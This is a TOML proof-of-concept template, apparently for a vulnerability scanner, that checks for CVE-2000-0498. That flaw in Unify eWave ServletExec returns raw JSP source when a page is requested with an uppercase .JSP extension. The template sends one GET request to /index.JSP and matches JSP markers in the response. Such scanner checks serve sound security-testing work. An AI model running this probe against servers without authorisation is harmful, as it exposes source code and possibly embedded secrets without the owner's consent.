[info]
author = "ave"
description = "验证 Unify eWave ServletExec JSP 源代码泄露漏洞：通过请求大写 .JSP 扩展名绕过 Servlet 容器编译，直接获取 JSP 源代码"
id = "POC-AVE-2000-0558"
name = "CVE-2000-0498 PoC"
severity = "high"
tags = ["ave-2000-0558"]
vuln_id = [
    "CVE-2000-0498",
    "AVE-2000-0558",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/index.JSP"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "%>",
    "import",
    "pageContext",
    "jsp:include",
    "jsp:forward",
    "<%@",
    "page language=",
]
